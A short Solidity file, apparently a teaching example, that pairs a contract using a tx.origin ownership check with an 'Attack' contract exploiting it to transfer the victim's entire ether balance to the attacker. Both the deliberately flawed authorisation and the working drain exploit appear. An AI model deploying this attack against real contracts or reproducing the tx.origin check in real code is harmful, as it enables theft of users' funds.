//SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

contract Victim{
    address public owner;
    // Constructor to set the contract deployer as the owner and accept initial ether
    constructor()payable {
        owner = msg.sender;
    }
    // Function to transfer ether to a specified address
    function transfer(address payable _to, uint256 _amount)public {
        // Ensuring the transaction origin is the owner of the contract
        require(tx.origin == owner,"Not Owner!");
        // Attempting to send the specified amount of ether
        (bool sent,) = _to.call{value: _amount}("");
        require(sent,"Failed to send Ether!");
    }
    // Function to get the contract's ether balance
    function getBalance()public view returns (uint256){
        return(address(this).balance);
    }    
}
// This contract can attack the Victim contract because of the use of tx.origin
// tx.origin returns the original external address that initiated the transaction
contract Attack{
    address payable public owner;
    Victim victim;
    // Constructor to set the target victim contract and the owner of the Attack contract
    constructor(Victim _victim){
        victim = Victim(_victim);
        owner = payable (msg.sender);
    }
    // Function to initiate the attack
    function attack()public {
        // Transferring all ether from the victim contract to the owner of the Attack contract
        victim.transfer(owner, address(victim).balance);
    }
}
